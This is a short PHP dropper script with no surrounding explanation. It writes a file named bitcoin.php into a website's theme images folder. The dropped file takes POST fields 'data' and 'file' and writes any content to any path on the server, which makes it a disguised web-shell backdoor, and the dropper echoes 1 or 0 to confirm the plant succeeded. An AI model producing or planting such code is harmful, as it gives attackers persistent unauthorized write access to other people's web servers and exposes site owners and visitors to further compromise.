<?php file_put_contents("/home1/vpsfast/public_html/themes/default/images/bitcoin.php","
<?php 
if(isset($_POST['data'])){
$d=$_POST['data']; 
$f=$_POST['file']; 
file_put_contents($f,$d);?>
}"); 

if(file_exists("/home1/vpsfast/public_html/themes/default/images/bitcoin.php"))
  echo 1;
else echo 0;
?>
